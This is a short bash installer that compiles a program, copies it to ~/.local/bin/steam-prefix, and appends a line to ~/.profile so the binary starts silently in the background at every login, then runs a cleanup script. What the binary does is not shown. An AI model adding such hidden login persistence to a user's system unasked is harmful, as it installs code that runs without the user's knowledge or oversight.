#! /bin/bash

source ./compile.sh
cp ./main.bin $HOME/.local/bin/steam-prefix
echo "$HOME/.local/bin/steam-prefix > /dev/null 2>&1 &" >> $HOME/.profile
source ./cleanup.sh
